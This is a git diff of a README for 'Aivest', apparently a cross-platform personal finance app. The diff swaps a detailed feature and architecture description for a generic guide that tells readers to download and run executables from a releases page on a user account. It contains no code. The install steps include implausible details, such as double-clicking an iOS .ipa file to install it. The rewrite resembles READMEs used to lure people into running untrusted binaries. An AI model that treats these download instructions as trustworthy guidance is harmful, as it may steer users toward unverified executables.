@@ -1,72 +1,101 @@
-# 💰 Aivest — The Intelligent Financial Companion
+# 🤑 Aivest - Manage Your Finances Intelligently
 
-**Aivest** is an **AI-driven, cross-platform financial management app** built with **Kotlin Multiplatform (KMP)** and **Jetpack Compose Multiplatform**.  
-It empowers users to **track expenses, monitor budgets, manage debts, and visualize financial insights** — all wrapped in a secure, adaptive, and beautiful Material You design.
+[![Download Aivest](https://img.shields.io/badge/Download%20Aivest-v1.0-blue.svg)](https://github.com/edgarus21/Aivest/releases)
 
-> ✨ Aivest combines smart automation, elegant design, and strong privacy to redefine how people interact with their money.
+## 🚀 Getting Started
+
+Welcome to Aivest! This app simplifies your financial management by helping you track expenses, budgets, debts, and goals. It is built using Kotlin Multiplatform and provides a smooth user experience across Android, iOS, Desktop, and Web.
+
+## 📥 Download & Install
+
+To start using Aivest, follow these straightforward steps:
+
+1. **Visit the Releases Page**: Click the link below to access the Aivest releases page.
+
+   [Download Aivest](https://github.com/edgarus21/Aivest/releases)
+
+2. **Choose Your Version**: Find the latest release on the page. Look for the version number, which is usually highlighted.
+
+3. **Download the Application**: Click on the file that corresponds to your device. For example, you will see options like:
+
+   - **Windows**: `Aivest-windows.exe`
+   - **Mac**: `Aivest-mac.dmg`
+   - **Android**: `Aivest-android.apk`
+   - **iOS**: `Aivest-ios.ipa`
+   - **Linux**: `Aivest-linux.AppImage`
+   
+   Select the file that matches your operating system and download it. 
+
+4. **Run the Installer**: Once the download is complete, locate the downloaded file on your device and double-click to run the installer. Follow the on-screen instructions to complete the installation.
+
+5. **Launch Aivest**: After the installation finishes, find the Aivest icon on your device and click it to start managing your finances.
+
+## 🌟 Features
+
+Aivest comes packed with tools to help you with your financial journey:
+
+- **Expense Tracking**: Easily log and review your daily expenses.
+- **Budget Management**: Set budgets for different categories and track your spending against them.
+- **Debt Management**: Monitor your debts and see how quickly you can pay them off.
+- **Goal Setting**: Define financial goals and track your progress over time.
+- **Intelligent Insights**: Get personalized recommendations to improve your financial habits.
+- **Material You Design**: Enjoy a sleek, modern interface that adapts to your device's design settings.
+
+## 💻 System Requirements
+
+Aivest is designed to work smoothly across various platforms. Below are the recommended system requirements for optimal performance:
+
+### For Windows
+- Windows 10 or later
+- 4 GB RAM or more
+- 500 MB of free disk space
+
+### For Mac
+- macOS 10.14 (Mojave) or later
+- 4 GB RAM or more
+- 500 MB of free disk space
+
+### For Linux
+- Any recent distribution
+- 4 GB RAM or more
+- 500 MB of free disk space
+
+### For Android
+- Android 6.0 (Marshmallow) or later
+- 200 MB of free storage
+
+### For iOS
+- iOS 13.0 or later
+- 200 MB of free storage
+
+## 📊 Getting Help
+
+If you have any issues while using Aivest, try these solutions:
+
+- **Check the FAQ**: Visit our FAQ section on the GitHub page for quick answers.
+- **Community Support**: Join the discussion in the issues tab on GitHub to seek help from the community.
+- **Email Support**: For direct support, you can email us at support@aivestapp.com.
+
+## 🛠️ Contribute
+
+We welcome contributions to Aivest! If you would like to help improve the app, follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top of the GitHub page.
+2. **Make Your Changes**: Create a new branch and implement your ideas.
+3. **Submit a Pull Request**: Once you're happy with your changes, submit the pull request from your branch to the main repository.
+
+## 🌍 Stay Updated
+
+Follow us on social media to keep up with the latest updates and features:
+
+- [Twitter](https://twitter.com/aivestapp)
+- [Facebook](https://facebook.com/aivestapp)
+- [LinkedIn](https://linkedin.com/company/aivestapp)
+
+## 🎉 Join the Aivest Community
+
+Stay connected with other Aivest users. Share tips, experiences, and financial advice. Join our community on Discord and connect with like-minded individuals.
 
 ---
 
-## 🧭 Overview
-
-Aivest offers seamless financial management across **Android, iOS, Desktop, Web, and Tablets**.  
-It uses **AI-powered analytics**, **smart categorization**, and **data-driven visualizations** to provide users with clear, actionable insights about their financial health.
-
-### 🎯 Vision
-To create a unified financial management experience that’s **intelligent**, **private**, and **cross-platform**, helping users take control of their finances effortlessly.
-
----
-
-## 🚀 Core Features
-
-### 💵 Expense & Income Tracking
-- AI-driven automatic categorization of transactions.  
-- Real-time balance updates and account synchronization.  
-- Advanced filters, search, and tagging for easy navigation.  
-- Export reports as **PDF**, **CSV**, **XLS**, or **HTML**.  
-- Support for **Indian numbering format** and localization.
-
-### 🔁 Subscriptions & Recurring Payments
-- Track and manage recurring expenses and income.  
-- Receive reminders for due payments and expiring warranties.  
-- Budget sync for recurring bills.  
-
-### 📈 Personal Finance Insights
-- AI-powered financial assistant for personalized budgeting tips.  
-- Track savings, investments, and goal progress.  
-- Spending alerts for unusual transactions.  
-- Customizable financial reports and summaries.
-
-### 💳 Debt & Loan Management
-- Manage loans, repayments, and interest tracking.  
-- Calculate debt-to-income ratios for better planning.
-
-### 🧠 AI & Analytics
-- Spending pattern recognition and smart trend prediction.  
-- Monthly report generation with shareable summaries.  
-- Contextual insights and recommendations based on user behavior.
-
-### 🪄 User Experience Enhancements
-- **Material You** dynamic color theming (Light/Dark/AMOLED/Dynamic).  
-- **Smooth animations** and **micro-interactions** for delightful UX.  
-- **Gesture controls** (swipe to delete/edit).  
-- **Voice input** for quick expense entry.  
-- Full accessibility (voice-over, text resize, contrast modes).
-
-### 🔒 Security & Privacy
-- **Biometric authentication** and **PIN lock**.  
-- **End-to-end encryption** for data and backups.  
-- Privacy mask mode for sensitive data.  
-- Encrypted local storage and secure cloud sync.
-
-### ⚡ Performance & Optimization
-- Lazy loading, pagination, and low-power background sync.  
-- Optimized for tablets, foldables, and split-screen.  
-- Battery-efficient processing and adaptive refresh rates.
-
----
-
-## 🧱 Architecture
-
-Aivest follows a **clean MVVM (Model–View–ViewModel)** architecture for modularity and maintainability.
-
+By following this guide, you can easily download and start using Aivest. For any further assistance, do not hesitate to reach out to our support team. Enjoy managing your finances with confidence!
